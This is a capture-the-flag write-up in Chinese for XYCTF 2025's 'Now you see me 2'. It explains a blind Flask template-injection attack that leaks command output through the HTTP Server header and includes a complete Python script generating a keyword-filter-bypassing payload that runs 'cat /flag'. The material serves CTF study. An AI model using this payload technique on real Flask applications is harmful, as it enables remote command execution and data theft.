# [XYCTF 2025] Now you see me 2
这是`Now you see me 1`的续作，环境更加苛刻，没有任何直接回显。我们需要找到一种方法来外带执行结果。

## 漏洞分析
核心的漏洞点仍然是Flask的SSTI，但是由于没有回显，我们需要利用其他方式将命令执行的结果带出来。
这里利用`werkzeug.serving.WSGIRequestHandler.server_version`，通过修改响应头中的`Server`字段，将我们想要的数据作为`Server`头的值来外带。

## 攻击流程
1.  **构造payload**:
    我们需要构造一个payload，通过SSTI修改`werkzeug.serving.WSGIRequestHandler.server_version`的值为我们命令执行的结果。
    因为大部分的关键字都被过滤了，所以payload的构造过程和`Now you see me 1`类似，通过`request.endpoint`和`request.data`来获取我们需要的字符。

2.  **外带数据**:
    我们可以通过`os.popen('whoami').read()`来执行命令并读取结果，然后将结果设置为`server_version`的值。
    ```python
    # 伪代码
    from werkzeug.serving import WSGIRequestHandler
    WSGIRequestHandler.server_version = os.popen('whoami').read()
    ```

3.  **发送请求并观察响应头**:
    发送构造好的请求后，查看返回的HTTP响应头，我们就可以在`Server`字段中看到命令执行的结果。

exp:
```python
import re
payload = []

def generate_rce_command(cmd):
    global payload
    payloadstr = "{%print(request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('werkzeug')|attr('serving')|attr('WSGIRequestHandler')|attr('__setattr__')('server_version',request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('" + cmd + "')|attr('read')()))%}"

    required_encoding = re.findall('\'([a-z0-9_ /\\.]+)\'', payloadstr)

    offset_a = 16
    offset_0 = 6

    encoded_payloads = {}

    arg_count = 0
    for i in required_encoding:
        print(i)
        if i not in encoded_payloads:
            p = []
            for j in i:
                if j == '_':
                    p.append('k.2')
                elif j == ' ':
                    p.append('k.3')
                elif j == '.':
                    p.append('k.4')
                elif j == '-':
                    p.append('k.5')
                elif j.isnumeric():
                    a = str(ord(j)-ord('0')+offset_0)
                    p.append(f'k.{a}')
                elif j == '/':
                    p.append('k.68')
                else:
                    a = str(ord(j)-ord('a')+offset_a)
                    p.append(f'k.{a}')
            arg_name = f'a{arg_count}'
            encoded_arg = '{%' + '%0a'.join(['set', arg_name , '=', '~'.join(p)]) + '%}'
            encoded_payloads[i] = (arg_name, encoded_arg)
            arg_count+=1
            payload.append(encoded_arg)
    fully_encoded_payload = payloadstr
    for i in encoded_payloads.keys():
        if i in fully_encoded_payload:
            fully_encoded_payload = fully_encoded_payload.replace("'"+ i +"'", encoded_payloads[i][0])
    payload.append(fully_encoded_payload)
command = "cat /flag"
payload.append(r'{%for%0ai%0ain%0arequest.endpoint|slice(1)%}')
word_data = ''
endpoint = 'r3al_ins1de_th0ught'
for i in 'data':
    word_data += 'i.' + str(endpoint.find(i)) + '~'
word_data = word_data[:-1] # delete the last '~'
print("data: "+word_data)
payload.append(r'{%set%0adat='+word_data+'%}')
payload.append(r'{%for%0ak%0ain%0arequest|attr(dat)|string|slice(1)%0a%}')
generate_rce_command(command)


payload.append(r'{%endfor%}')
payload.append(r'{%endfor%}')
output = ''.join(payload)

print(r"Follow-your-heart-%23}"+output)
```

